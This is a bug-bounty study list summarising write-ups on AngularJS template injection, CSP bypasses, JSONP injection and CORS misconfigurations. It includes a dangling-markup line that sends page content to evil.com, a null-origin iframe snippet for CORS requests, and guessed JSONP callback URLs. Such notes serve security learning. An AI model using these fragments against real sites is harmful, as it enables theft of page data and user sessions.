# specific-topics

Some specific topics about bug hunting.

### AngularJS

- [XSS without HTML: Client-Side Template Injection with AngularJS](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs) by Gareth Heyes
  - The author ananlysed AngularJS in details (what it is, the sandbox and the sanitizer), there is also some source code to help the reader understand this writeup. 
  - There is a list of sandbox bypasses payloads.
- [DOM based AngularJS sandbox escapes](https://portswigger.net/blog/dom-based-angularjs-sandbox-escapes) by Gareth Heyes
  - There is a list of DOM based Angular sandbox escapes payloads.
- [Adapting AngularJS payloads to exploit real world applications](https://portswigger.net/blog/adapting-angularjs-payloads-to-exploit-real-world-applications) by Gareth Heyes
  - Getting round the restriction (convert input to lower case) by using unicode escapes.
  - Bypassing no quotes or constructor allowed restrictions.
- [Walkthrough for Angular Expression Injection Challenge](https://ryhanson.com/angular-expression-injection-walkthrough/) by Ryan
  - This writeup is about how to break a web app (the instance used in this writeup is not available now).
  - The 'Most recent todo' didn't update after recieving the response tells us it requires a page refresh to load. This is a sign that part of the page is rendered on the server or not bound to an angular object. This may be a sign that we can inject an Angular Expression. (why?)
  - Web app might be using different start and end symbols for Angular expressions other than "{{" and "}}", search `.startSymbol(` in the source code could find them.
  - How to view an Angular scope in dev tools.
  - The todo list is being isolated by bearer token. When Bob (Bob is special and can view all the todos) view the injectd expression, he does end up adding a todo, but only to his own todo list. The only way we could see the todo Bob added is by changing his bearer token to our bearer token before he makes the request (which is possible).
  - CORS testing site: `https://cors-test.appspot.com/`.
  - Sites that offer request logging: `https://www.runscope.com/`, `https://www.mockable.io/`(how to use this site).
- [Exploiting Angular Expressions to Steal Session Tokens on Plunker](https://ryhanson.com/stealing-session-tokens-on-plunker-with-an-angular-expression-injection/) by Ryan
  - Mixing server side templates with client side templates opens up the opportunity for user input to get into a server-side view, that is then sent client side, and then evaluated by AngularJS.
  - The web app source code starts by setting `ng-app` on the html tag tells us that everything within the HTML tags will usually be within an Angular scope and evaluated by Angular. So if we can get an expression in the HTML sent from the server, chances are it will execute.
  - How to see the difference between what is sent from the server and what is created by the client: for the server response just "Right-Click -> View Page Source"; for the source that is evaluated/created by the client, look at the Elements tab in Chrome Dev Tools.
  - Some fixed suggestions.
- [Stored XSS in New Relic via Angular Expression Sandbox Escape](https://ryhanson.com/stored-xss-in-new-relic-via-angular-expression-sandbox-escape/) by Ryan
  - The admin of an account was able to set the Name of the Account to an Angular expression.
- [Reflected XSS through AngularJS sandbox bypass causes password exposure of McDonald users](https://finnwea.com/blog/stealing-passwords-from-mcdonalds-users/) by Tijme Gommers
  - Find the AngularJS version by executing `angular.verion` in the "Console" in Chrome debug tool.
  - The difference between "Remember me" and "Remember the password" (the author found code decrypting passwords on clint side) when signing in.
  - The payload in this writeup is worth to study and explore.
- [Hostinger bug bounty: Reflected XSS via angularJS template injection](https://blog.ibrahimdraidia.com/xss-via-angularjs-template-injection_hostinger/) by Taha Ibrahim DRAIDIA
  - Just find the AngularJS version by executing `angular.verion` in the "Console" in Chrome debug tool, then apply the known payload.
- [Angular 1.6 - Expression Sandbox Removal](https://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html) by Pete Bacon Darwin
  - What is the expression sandbox, why added the sandbox, why removed the sandbox, what are the security implications.
- [AngularJS 1.6: Life outside the sandbox](https://www.synopsys.com/blogs/software-security/angularjs-1-6-0-sandbox/) by David Johansson
  - A seemed harmless function (orderBy) controlled by attacker could cause large damage than you think.
- [Blind XSS AngularJS Payloads](https://ardern.io/2018/12/07/angularjs-bxss/) by Lewis Ardern
  - There is a list of blind XSS AngularJS payloads.

### CSP

- [Content Security Policy Reference](https://content-security-policy.com/) by Foundeo Inc
  - A table with keywords-vulues-meaning, we can use this as a manual.
- [How to use Google’s CSP Evaluator to bypass CSP](https://blog.thomasorlita.cz/vulns/google-csp-evaluator/) by Thomas Orlita
  - "Google's CSP Evaluator" is a really powerful and simple to use tool that helps you evalate how effective these restrictions are.
  - This tool is worth to use.
- [Useless CSP](https://uselesscsp.com/) by ?
  - As the title shows, it is listing CSP flaws in many popular website.
- [Using Google Analytics for data extraction](https://labs.detectify.com/2018/01/19/google-analytics-data-extraction/) by Linus Särud
  - Bypass CSP with `Google Analytics`.
  - Use HTML injection to extract data, injecting an unclosed atrribute that sucks up portions of a page, and exfiltrates them to an external endpoint (e.g. `<img src='https://evil.com/?` eats the page until the next `'`).
  - Chrome has taken additional steps to protect against this by blocking resources whose URLs contain both `\n` and `<` characters, [refer this](https://www.chromestatus.com/feature/5735596811091968).
- [Evading CSP with DOM-based dangling markup](https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup) by Gareth Heyes
  - Dangling markup is a technique to steal the contents of the page without script by using resources such as images to send the data to a remote location that an attacker controls. It is useful when reflected XSS doesn't work or is blokced by CSP.
  - The idea is you inject some partial HTML that is in an unfinished state such as a `src` attribute of an image tag, and the rest of the markup on the page closes the attribute but also sends the data in-between to the remote server.
  - `Content-Security-Policy: default-src 'none'; base-uri 'none';`.
  - We can use `base` tag to bypass this restriction. Using the `target` attribute on he `base` tag, we can change the "window name" of every link on the page, because the "window name" is exposed cross-domain, the attacker just needs to read the `window.name` property.
  - Mitigation: you can protect against the `base` tag injection by having your own base tag before any potential jnjection, this will prevent the second base tag from being able to overwrite the target.
  - Dom-based dangling markup without the `base` tag (Don't understand?).
- [Neatly bypassing CSP - How to trick CSP in letting you run whatever you want](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa) by Wallarm
  - CSP lists and describes paths and sources, from which the browser and safely load resources. The resources may include images, frames, javascripts and more. CSP policy is commonly used to block untrusted JS and minimize the chace of a successful XSS exploit.
  - A security policy implies "prohibited unless explicitly allowed".
  - `Content-Security-Policy: default-src 'self' 'unsafe-inline';`.
  - Despite the limitations, we can still upload scenarios, create freames and put together images because `self` does not prevent working with the resources governed by Self Origin Policy (SOP) (I think the author means "Same Origin Policy"). Since CSP also applies to frames, the same policy gorverns frames that may include data, blob or files formed with srcdoc as protocols. (what this means?)
  - Most of the modern browser automatically convert files, such as text files or images, to an HTML page. The reason for this behavior is to correctly depict the content in the browser window. However, iframe is also a browser window. Thus, opening any file that needs to shown in a browser in an iframe (i.e. `favicon.ico` or `robots.txt`) will immediately convert them into HTML without any data validation as long as the content-type is right.
  - If a frame opens a site page that doesn't have a CSP header, an open frame will execute all the JS inside the page. If the page has an XSS explit, we can write a js into the frame ourselves.
  - So, all you need for an XSS exploit is to open an iframe and point it at any path that doesn't include a CSP header. It can be the standard `favicon.ico`, `robots.txt`, `sitemap.xml`, `css/js`, `jpg` or other files.
  - If the site developer was careful and any expected site response (200 - OK) includes `X-Frame-Options: Deny`, we can still try to get in. Because the second common error in using CSP is a lack of protective headers when returning web scanner errors. The simplest way to try this is to try to open a web page that doesn't exist. May resources only include `X-Frame-Options` on response with 200 code and not with 404 code.
  - If that is also accounted for, we can try causing the site to return a standard web-server "invalid request" message. The author listed many methods.

### JSONP

- [What is JSONP all about](https://stackoverflow.com/questions/2067472/what-is-jsonp-all-about/2067584) by stackoverflow
- [JSONP (JSON with Padding or JSON-P)](https://en.wikipedia.org/wiki/JSONP) by wikipedia
  - What is JOSNP, why was it created, whta problem does it solve, why would developers use it.
  - Allow browser pages to work around the same-origin policy via `script` element injection.
  - The HTML `<script>` element is allowed to execute content retrieved from foreign origins. Services replying with pure JSON data were not able to share the data across domain before the adoption of CORS (Cross-Origin Resource Sharing).
  - In the JSONP usage pattern, the URL request pointed to by the `src` attribute in the `<script>` element returns JSON data, with Javascript code (usually a function call) wrapped around it. This "wrapped payload" is then interpreted by the browser. In this way, a function that is already defined in the Javascript environment can manipulate the JSON data.
  - Including `script` tags from remote servers allows the remote servers to inject any content into a website. If the remote servers have vulnerabilities that allow Javascript injection, the page served from the original server is exposed to an increased risk.
- [Practical JSONP Injection](https://securitycafe.ro/2017/01/18/practical-jsonp-injection/) by Petre Popescu
  - The callback function is hardcoded within the response:
    - basic function call
    - object method call
  - The callback function is dynamic:
    - completely controllable from the URL (GET variable)
    - partially controllable from the URL (GET variable), but appended with a number
    - controllable from the URL (GET variable), but initially not displayed in the request
  - Make sure you define your function before including the response, otherwise an undefined function will be called and you won't get any data.
  - When seeing an API call without callback, especially if the JSON formatted data is already between parentheses, manually add the "callback" to the request. If our "callback" is added to the response, we could grab some data.
  - If we have API call `http://verysecurebank.ro/getAccountTransactions`, we might try to guess the callback variable:
    - `http://verysecurebank.ro/getAccountTransactions?callback=test`
    - `http://verysecurebank.ro/getAccountTransactions?cb=test`
    - `http://verysecurebank.ro/getAccountTransactions?jsonp=test`
    - `http://verysecurebank.ro/getAccountTransactions?jsonpcallback=test`
    - `http://verysecurebank.ro/getAccountTransactions?jcb=test`
    - `http://verysecurebank.ro/getAccountTransactions?call=test`
  - List common issues we might encounter while hunting web applications for JSONP vulnerabilities.
  - Referer check bypass - We can abuse data URI scheme in order to make the request without a HTTP Referer. Since we are dealing with code, which include quotes, double quotes and other syntax breaking character, we are going to base64 encode our payload (callback definition and script inclusion).
  - Three main HTML tags that allow us to use the data URI scheme:
    - `iframe` (in the `src` attribute)
    - `embed` (in the `src` attribute)
    - `object` (in the `data` attribute)

### CORS

- [The Complete Guide to CORS (In)Security](https://www.bedefended.com/papers/cors-security-guide) by  Davide Danelon
  - The Same Origin Policy (SOP) rule allows scripts running in pages that come from the same site (same origin) to access methods and properties of other scripts without particular restrictions, while preventing access to most of the methods and properties between pages from different sites (different origin).
  - The term "origin" is defined using the:
    - domain name
    - application protocol
    - TCP port
  - CORS (Cross-Origin Resource Sharing) is a mechanism that, through the configuration of additional HTTP headers, tells the browser that a request, generated by a web application running at origin "A", has the permission to access the selected resource, served on origin "B".
  - The main header involved is the `Access-Control-Allow-Origin`, this header allows the listed origin to make visitors' web browsers send cross-domain requests to the server and read the responses. By default, without the `Access-Control-Allow-Credentials` header, this request will be issued without "credentials" (cookies or HTTP Authentication data), so it cannot be used to steal private user-specific information.
  - Servers can also notify clients whether "credentials" (both Cookies and HTTP Authentication data) should be sent with requests. This is done through the `Access-Control-Allow-Credentials` header that, if set to `true` by the server, allows the browser to send authenticated requests to the target handler.
  - The specification suggests to simply define a list of allowed origins separated by a space, for example:
    - `Access-Control-Allow-Origin: https://example1.com https://example2.com`
    - However, no browser currently supports this syntax.
  - Using a wildcard to trust all subdomains is not working, for example:
    - `Access-Control-Allow-Origin: *.example1.com`
  - The only wildcard origin that is currently supported is the following:
    - `Access-Control-Allow-Origin: *`
  - Despite the wildcard being supported by the browser, it cannot be used with the credentials flag set to `true`, the following headers configuration is not supported:
    - `Access-Control-Allow-Origin: *` `Access-Control-Allow-Credentials: true`
    - When repsponsing a request with credentials, the server must specify a single domain and therefore cannot use the wildcard.
    - Put simply the use of the wildcard effectively disables the `Access-Control-Allow-Credentials` header.
  - The results of these limitations and behavious is that many CORS implementations generate the `Access-Control-Allow-Origin` header based on the user-supplied `Origin` header value.
  - When testing CORS security flaws, one must find handlers for which the CORS is enabled.
    - APIs are a good canditate since very often they have to be contacted from different origins.
    - Usually servers configure CORS headers only if they receive the request containting the `Origin` header, thus it could be easy to miss this type of vulnerabilities.
    - Otherwise, if the responses received from the server contain any `Access-Control-*` headers, but no `Origin` is declared, it is possible that the server will generate the header base on the `Origin` input.
  - After mapping the candidates' handler, it is possible to send requests with the `Origin` header set. The tester should try with different `Origin` values, such as the original domain name of `null`. In this phase it could be useful to use some scripts to automate the process.
  - Two exploitable CORS configurations with `Access-Control-Allow-Credentials: true`:
    - `Access-Control-Allow-Origin: https://attacker.com` `Access-Control-Allow-Credentials: true`
    - `Access-Control-Allow-Origin: null` `Access-Control-Allow-Credentials: true`
  - Three exploitable CORS configurations without `Access-Control-Allow-Credentials`:
    - `Access-Control-Allow-Origin: https://attacker.com`
    - `Access-Control-Allow-Origin: null`
    - `Access-Control-Allow-Origin: *`
  - The CORS specification mentions also the `null` origin. This origin is triggered for example by redirects or from local HTML files. The target application may accept the `null` origin, and this could be exploited by attackers, since any website can easily obtain the `null` origin using a sandboxed iframe.
    - `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>**CORS request here**</script>'></iframe>`
  - List a series of `Origin` that can be used to bypass certain validation controls implemented to verify the validity of the `Origin` header.
- [Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties) by James Kettle
  - Websites enable CORS by sending the following HTTP response header:
    - `Access-Control-Allow-Origin: https://example.com` `Access-Control-Allow-Credentials: true`
    - This creates a trust relationship, an XSS vulnerability on `example.com` is bad news for this site.
  - Many parts of the previous writeup refers this writeup.
- [Exploiting Misconfigured CORS](http://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/) by geekboy
  - Poorly implemented, best case for attack:
    - `Access-Control-Allow-Origin: https://attacker.com` `Access-Control-Allow-Credentials: true`
  - Poorly implemented, exploitabel:
    - `Access-Control-Allow-Origin: null` `Access-Control-Allow-Credentials: true`
  - Bad implementation but not exploitable:
    - `Access-Control-Allow-Origin: *` `Access-Control-Allow-Credentials: true`
    - `Access-Control-Allow-Origin: *`
  - When we can't exploit even if above misconfigurations are present:
    - Presence of any custom header in the request which is getting used to authenticate the user.
    - Presence of any unique / authentication / key in the request URI.
  - The poc in this writeup is worth to learn.
- [Critical Issue Opened Private Chats of Facebook Messenger Users Up to Attackers](https://www.cynet.com/wp-content/uploads/2016/12/Blog-Post-BugSec-Cynet-Facebook-Originull.pdf) by cynet
  - Facebook also allows normal "GET" requests to the chat domain. But normal "GET" requests do not come with an `Origin` header. The `Origin` header is a special header sent by the browser only with XHR (XML HTTP Request) requests.
  - When the server receives a "GET" request, it does not include the `Origin` header. In many development languages, nonexistent headers are represented by the "null" vaule. If Facebook expected to receive `null` in the `Origin` header, it would not block requests from this `Origin`.
  - Most likely, the filtering mechanism is separated from the responder mechanism, and the responder assumes that the value in the `Origin` header is allowed, because if not, the filter would already have dropped the request. This development design allows Facebook to add authorized origins by changing code in one position only.
  - In conclusion, the `null` origin passes the filter check, allowing it to pass as a normal "GET" request. The responder took the value of the `Origin` header from the request, and placed it as the value for `Access-Control-Allow-Origin` header in the response.
  - In this manner, we ascertained that were we to send a request from the page with a `null` origin, we would most likely get the `Access-Control-Allow-Origin` header in response to the `null` origin.
  - When we sent the request with the origin `null`, Facebook responded with a `null` value on `Access-Control-Allow-Origin`. This meant that if we could cause the browser to send `null` in the `origin` header, we would get a `null` value in the `Access-Control-Allow-Origin`.
  - It was also possible to use the data scheme in order to send requests with the origin `null`. When a data scheme is used, the browser sets the origin to `null` for security purposes.
  - Facebook uses a continually repeated XHR request to the server to receive newly arrived messages. The server responds only when a message arrives, or at timeout. Using this method means that there is always an XHR request waiting for a server response. When the server responds to a request, Javascript code opens a new request to the server.
  - The poc in this writeup is worth to learn. 

### S3 Bucket

- [S3 Bucket Misconfiguration: From Basics to Pawn](https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn/) by JAY JANI
